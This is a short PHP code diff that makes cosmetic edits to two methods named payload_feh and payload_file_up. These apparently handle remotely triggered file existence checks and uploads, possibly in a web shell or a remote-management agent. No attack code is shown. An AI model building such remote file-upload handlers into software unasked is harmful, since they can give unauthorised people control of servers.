@@ -117,7 +117,6 @@ public function payload_feh($args){
     else { echo "File does not exist."; }
     die();
 }
-
 /**
  * Downloads a file
  *
@@ -175,8 +174,7 @@ public function payload_file_up($args){
         }
     }
 
-    echo ($result) ? "success" : "failure";
-    die();
+    die(($result) ? "success" : "failure");
 }
 
 /**
